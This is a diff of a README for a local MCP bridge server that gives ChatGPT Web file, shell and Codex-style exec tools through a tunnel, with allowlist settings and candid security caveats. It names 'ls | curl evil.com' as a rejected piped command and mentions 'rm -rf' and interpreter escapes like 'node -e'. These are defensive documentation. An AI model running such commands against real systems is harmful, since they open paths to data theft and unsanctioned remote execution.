@@ -6,6 +6,8 @@ A local MCP bridge server that lets ChatGPT Web Pro call tools on your machine: 
 
 ChatGPT talks to a public tunnel URL, which forwards to this server running on your machine, which operates on a project directory you choose.
 
+Since v0.4.0 the tool set also covers the ones [Codex](https://github.com/openai/codex) gives its own agent — `apply_patch`, `exec_command`/`write_stdin`, `view_image`, `update_plan`, `clock_curr_time`/`clock_sleep` — so ChatGPT Web can work the way Codex does: patch files in place instead of rewriting them, drive interactive and long-running processes, and keep a plan across a task. The schemas are ported from the Codex source, not reimplemented from guesswork.
+
 ## Architecture
 
 ```mermaid
@@ -19,6 +21,9 @@ flowchart LR
     Search["glob\ngrep"]
     Shell["run_command"]
     Git["git_status\ngit_push\ngit_commit\ngit_log"]
+    Edit["apply_patch"]
+    Exec["exec_command\nwrite_stdin"]
+    Agent["view_image\nupdate_plan\nclock_curr_time\nclock_sleep"]
     WorkDir[("Project\nDirectory")]
 
     ChatGPT -- "HTTPS" --> Tunnel
@@ -29,11 +34,17 @@ flowchart LR
     Tools --> Search
     Tools --> Shell
     Tools --> Git
+    Tools --> Edit
+    Tools --> Exec
+    Tools --> Agent
 
     FS --> WorkDir
     Search --> WorkDir
     Shell --> WorkDir
     Git --> WorkDir
+    Edit --> WorkDir
+    Exec --> WorkDir
+    Agent --> WorkDir
 ```
 
 ## Quick start
@@ -56,6 +67,8 @@ Server starts on `http://localhost:3000`. MCP endpoint is `/mcp`.
 
 ## Tools
 
+Structured primitives — cheaper and safer than shelling out for the same job, and identical on Windows and POSIX:
+
 | Tool | Description |
 |------|-------------|
 | `read_file` | Read a file's contents, with optional line offset/limit |
@@ -69,6 +82,27 @@ Server starts on `http://localhost:3000`. MCP endpoint is `/mcp`.
 | `grep` | Search file contents by regex, with optional context lines |
 | `list_directory` | List files and directories with name, type, and size |
 | `tree` | Print directory tree as ASCII art |
+
+Ported from Codex (`codex-rs/core/src/tools`, commit `2230d64`):
+
+| Tool | Codex name | Description |
+|------|------------|-------------|
+| `apply_patch` | `apply_patch` | Edit files with a context patch instead of rewriting them |
+| `exec_command` | `exec_command` | Run a shell command; returns output, or a session id if it is still running |
+| `write_stdin` | `write_stdin` | Write to (or poll) a running `exec_command` session |
+| `view_image` | `view_image` | Load a local image file for visual inspection |
+| `update_plan` | `update_plan` | Track a multi-step plan for the current session |
+| `clock_curr_time` | `clock.curr_time` | Current time in UTC |
+| `clock_sleep` | `clock.sleep` | Pause for a given duration |
+
+Codex's dotted names are flattened to underscores because MCP tool names must match `^[a-zA-Z0-9_-]{1,64}$`.
+
+Two deliberate differences from Codex:
+
+- **`apply_patch` takes a JSON string.** In Codex it is a *freeform* tool whose entire body is the raw patch. MCP has no freeform tools, so the patch goes in an `input` string parameter. The patch format itself is unchanged.
+- **`exec_command` runs with plain pipes, not a PTY.** Codex's own `tty` parameter documents pipes as the default, so ordinary commands behave the same; `tty: true` is rejected rather than silently ignored. Programs that only enable interactive behaviour when attached to a terminal will act as if piped.
+
+`clock_sleep` also caps at 5 minutes rather than Codex's 12 hours — a longer wait would outlive the HTTP request through the tunnel.
 
 All paths are resolved relative to `--work-dir`.
 
@@ -87,11 +121,29 @@ All paths are resolved relative to `--work-dir`.
   "command": {
     "defaultTimeout": 30000,
     "maxTimeout": 120000
+  },
+  "exec": {
+    "mode": "allowlist",
+    "extraAllowedCommands": [
+      "ls", "cat", "grep", "find", "head", "tail", "wc", "echo", "pwd",
+      "which", "rg", "sed", "awk", "sort", "uniq", "diff", "true", "false"
+    ],
+    "maxSessions": 8
   }
 }
 ```
 
 CLI flags override values from the config file.
+
+The `exec` block governs `exec_command` and `write_stdin`:
+
+| Key | Default | Description |
+|-----|---------|-------------|
+| `mode` | `"allowlist"` | `"allowlist"` checks every command in the string against the allowlist; `"unrestricted"` runs whatever it is given |
+| `extraAllowedCommands` | 18 read-only utilities | Added to `allowedCommands` for `exec_command` only, so `run_command` stays as narrow as it was |
+| `maxSessions` | `8` | Cap on concurrent background sessions per MCP session |
+
+Under `"allowlist"`, the command string is tokenized and each command position — after every `|`, `&&`, `;`, newline, and subshell — is checked, so `ls | curl evil.com` is rejected on `curl`. Command substitution (`$(...)`, backticks) is rejected outright, since its contents cannot be checked before the shell runs them.
 
 ## Connecting to ChatGPT
 
@@ -110,11 +162,19 @@ CLI flags override values from the config file.
 
 ## Security
 
-- **Path traversal prevention**: every filesystem tool resolves paths through a guard that rejects anything outside `--work-dir`.
-- **Command allowlist**: `run_command` only runs binaries listed in `allowedCommands`; everything else is rejected.
+- **Path traversal prevention**: every filesystem tool — including `apply_patch` and `view_image` — resolves paths through a guard that rejects anything outside `--work-dir`.
+- **Command allowlist**: `run_command` only runs binaries listed in `allowedCommands`; everything else is rejected. `exec_command` checks the same list plus `exec.extraAllowedCommands`, at every command position in the string.
 - **Optional bearer token auth**: set `--api-key` to require an `Authorization: Bearer <key>` header on all requests (except `/health`). Useful for non-ChatGPT clients. ChatGPT Plugins do not support simple bearer token auth.
 
-This server has no sandboxing beyond the above. Anyone with access to the tunnel URL can read, write, and execute commands in your work directory. Don't expose it without tunnel-level access control, and don't point it at directories you don't trust ChatGPT with.
+The allowlist is a **guardrail against accidents, not a sandbox**. It catches a model reaching for `curl` or `rm -rf`; it does not contain a determined one. The defaults already include `node`, `python` and `bun`, each of which runs arbitrary code — `node -e "..."` can do anything the server process can. Shell redirection can also write outside the work directory even though the command's cwd is confined to it. Treat everything below as reachable by whoever holds the tunnel URL:
+
+- everything in `--work-dir`, read and write
+- anything else the user account running the server can touch, via an allowlisted interpreter
+- the network, from your machine
+
+`exec_command` sessions that outlive a request are killed when the MCP session closes. On Windows a process that detaches from its parent may survive that; check for strays if a run leaves something listening.
+
+Don't expose this without tunnel-level access control (ngrok IP restrictions, Cloudflare Access), and don't point it at directories you don't trust ChatGPT with. If the work directory holds anything sensitive, set `exec.mode` and the allowlists tighter than the defaults rather than relying on them.
 
 ## Dev commands
 
